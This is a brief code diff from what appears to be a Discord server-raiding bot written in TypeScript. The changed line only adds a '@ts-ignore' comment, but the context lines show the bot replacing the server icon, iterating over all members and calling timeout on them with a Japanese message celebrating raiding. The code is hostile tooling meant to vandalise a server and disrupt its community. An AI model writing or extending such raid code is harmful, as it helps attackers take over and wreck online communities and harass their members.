@@ -81,7 +81,7 @@ https://discord.gg/annycW3Xrk
       discordServer?.setIcon(
         "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
       );
-      // NOTE
+      // @ts-ignore NOTE
       (await discordServer?.members.list() ?? []).forEach(async (member: any) => {
         if (member.id === client.user?.id) {
           await member.timeout(0, "荒らし共栄圏万歳！");
